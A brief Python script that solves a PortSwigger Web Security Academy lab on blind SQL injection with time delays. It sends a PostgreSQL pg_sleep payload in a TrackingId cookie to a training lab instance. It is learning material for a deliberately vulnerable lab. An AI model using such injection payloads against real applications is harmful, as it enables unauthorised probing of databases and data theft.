# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
# Lab: Blind SQL injection with time delays
# Difficulty: PRACTITIONER

import requests

url = "https://0af6004e03804f3183151a9100a600ae.web-security-academy.net/"

payload = "x'||pg_sleep(10)--"

r = requests.session()
s = r.get(url, cookies={"TrackingId": payload})